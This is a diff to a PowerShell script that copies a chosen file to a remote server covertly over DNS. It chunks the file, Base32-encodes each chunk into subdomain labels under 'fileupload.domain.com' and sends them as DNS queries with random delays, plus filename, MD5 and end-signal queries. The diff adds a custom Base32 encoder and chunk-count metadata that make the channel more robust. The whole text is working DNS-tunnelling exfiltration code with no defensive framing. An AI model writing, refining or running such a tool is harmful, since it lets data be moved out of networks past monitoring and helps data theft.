@@ -2,6 +2,34 @@
 $DNS_PORT = 53
 $domain = "fileupload.domain.com"  # Domain to use
 
+# Base32 encoding function in PowerShell
+function Base32-Encode {
+    param (
+        [byte[]]$bytes
+    )
+    
+    $alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+    $output = ""
+    $buffer = 0
+    $bitsLeft = 0
+
+    foreach ($byte in $bytes) {
+        $buffer = ($buffer -shl 8) -bor $byte
+        $bitsLeft += 8
+
+        while ($bitsLeft -ge 5) {
+            $bitsLeft -= 5
+            $output += $alphabet[($buffer -shr $bitsLeft) -band 31]
+        }
+    }
+
+    if ($bitsLeft -gt 0) {
+        $output += $alphabet[($buffer -shl (5 - $bitsLeft)) -band 31]
+    }
+
+    return $output
+}
+
 # Function to resolve a DNS name to an IP address if necessary
 function Resolve-DnsNameOrIp {
     param (
@@ -49,7 +77,6 @@ function Send-DNSQuery {
         [double]$maxDelay
     )
 
-    # Resolve DNS name or use IP address
     try {
         $serverIP = Resolve-DnsNameOrIp -server $server
         $serverEndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($serverIP), $DNS_PORT)
@@ -74,21 +101,24 @@ function Send-DNSQuery {
     }
 }
 
-# Function to send file information (filename and MD5 hash)
+# Function to send file information (filename, MD5 hash, and chunk count)
 function Send-FileInfo {
     param (
         [string]$fileName,
         [string]$fileMD5,
+        [int]$totalChunks,
         [string]$server,
         [string]$domain,
         [double]$maxDelay
     )
 
-    $encodedFileName = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($fileName)) -replace '='
-    $encodedFileMD5 = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($fileMD5)) -replace '='
+    # Base32 encode the filename, MD5 hash, and chunk count as strings
+    $encodedFileName = Base32-Encode ([System.Text.Encoding]::ASCII.GetBytes($fileName))
+    $encodedFileMD5 = Base32-Encode ([System.Text.Encoding]::ASCII.GetBytes($fileMD5))
+    $encodedChunkCount = Base32-Encode ([System.Text.Encoding]::ASCII.GetBytes([string]$totalChunks))
 
-    $query = "f.$encodedFileName.$encodedFileMD5.$domain"
-    Write-Host "Sending file info: $fileName, MD5: $fileMD5"
+    $query = "f.$encodedFileName.$encodedFileMD5.$encodedChunkCount.$domain"
+    Write-Host "Sending file info: $fileName, MD5: $fileMD5, Total Chunks: $totalChunks"
     Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
 }
 
@@ -98,23 +128,22 @@ function Send-FileChunks {
         [string]$filePath,
         [string]$server,
         [string]$domain,
-        [double]$maxDelay
+        [double]$maxDelay,
+        [int]$totalChunks
     )
-
-    $fileSize = (Get-Item $filePath).Length
-    $chunkSize = 512  # Size of each chunk in bytes
-    $totalChunks = [Math]::Ceiling($fileSize / $chunkSize)
 
     $fileStream = [System.IO.File]::OpenRead($filePath)
     $chunkNumber = 0
 
     while ($chunkNumber -lt $totalChunks) {
-        $buffer = New-Object byte[] $chunkSize
-        $bytesRead = $fileStream.Read($buffer, 0, $chunkSize)
-        $encodedChunkData = [Convert]::ToBase64String($buffer[0..($bytesRead-1)])
+        $buffer = New-Object byte[] 512  # Size of each chunk in bytes
+        $bytesRead = $fileStream.Read($buffer, 0, 512)
+        $encodedChunkData = Base32-Encode $buffer[0..($bytesRead-1)]
 
-        $query = "c$chunkNumber.$($encodedChunkData -replace '=','').$domain"
-        Write-Host "Sending chunk $chunkNumber"
+        # Display the current chunk number and total chunk count
+        Write-Host "Sending chunk $chunkNumber of $totalChunks"
+
+        $query = "c$chunkNumber.$encodedChunkData.$domain"
         Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
 
         $chunkNumber++
@@ -144,21 +173,25 @@ function Send-File {
         [string]$server
     )
 
+    $filePath = $filePath.Trim('"')  # Remove surrounding quotes if any
     $fileName = [System.IO.Path]::GetFileName($filePath)
     $fileMD5 = Calculate-MD5 -filePath $filePath
+    $fileSize = (Get-Item $filePath).Length
+    $chunkSize = 512
+    $totalChunks = [Math]::Ceiling($fileSize / $chunkSize)
 
-    # Send file info (filename and MD5 hash)
-    Send-FileInfo -fileName $fileName -fileMD5 $fileMD5 -server $server -domain $domain -maxDelay $maxDelay
+    # First send file info (filename, MD5 hash, and chunk count)
+    Send-FileInfo -fileName $fileName -fileMD5 $fileMD5 -totalChunks $totalChunks -server $server -domain $domain -maxDelay $maxDelay
 
-    # Send file chunks with random delays
-    Send-FileChunks -filePath $filePath -server $server -domain $domain -maxDelay $maxDelay
+    # Now send file chunks
+    Send-FileChunks -filePath $filePath -server $server -domain $domain -maxDelay $maxDelay -totalChunks $totalChunks
 
     # Signal the end of transmission
     Send-EndSignal -server $server -domain $domain -maxDelay $maxDelay
 }
 
 # Example usage of the main function
-$filePath = Read-Host "Enter the file path to send:"
-$server = Read-Host "Enter the DNS name or IP address of the server (ex. domain.com):"
-$maxDelay = [double](Read-Host "Enter the maximum delay (in seconds) between queries:")
+$filePath = Read-Host "Enter the file path to send"
+$server = Read-Host "Enter the DNS name or IP address of the server"
+$maxDelay = [double](Read-Host "Enter the maximum delay (in seconds) between queries")
 Send-File -filePath $filePath -maxDelay $maxDelay -server $server
